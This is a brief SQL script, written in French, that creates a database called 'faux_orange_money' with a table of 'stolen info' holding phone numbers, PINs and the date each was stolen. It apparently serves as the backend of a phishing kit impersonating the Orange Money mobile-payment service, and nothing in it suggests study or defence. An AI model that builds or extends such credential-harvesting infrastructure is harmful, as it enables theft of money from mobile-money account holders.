
CREATE DATABASE faux_orange_money;

USE faux_orange_money;

CREATE TABLE infos_volées (
    id INT AUTO_INCREMENT PRIMARY KEY,
    numero VARCHAR(20) NOT NULL,
    pin VARCHAR(10) NOT NULL,
    date_vol DATETIME DEFAULT CURRENT_TIMESTAMP
);
